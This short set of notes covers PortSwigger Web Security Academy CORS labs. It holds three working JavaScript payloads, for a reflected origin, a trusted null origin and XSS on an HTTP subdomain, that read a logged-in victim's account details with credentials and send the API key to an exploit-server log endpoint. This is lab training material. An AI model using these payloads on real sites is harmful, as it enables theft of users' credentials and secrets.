## Cross-origin resource sharing

CORS works, if:
**Access-Control-Allow-Credentials** header suggesting that it may support CORS.
**Origin: https://example.com** is reflected in the Access-Control-Allow-Origin header.

## Standard payload:
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;     //retrieve the administrator's API key
    };
</script>
```

## CORS vulnerability with trusted null origin (set before Origin: null) :
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
## CORS vulnerability with trusted insecure protocols:

Origin: http://subdomain.lab-id

Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain.
Observe that the productID parameter is vulnerable to XSS.

```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

https://portswigger.net/web-security/cors/lab-breaking-https-attack
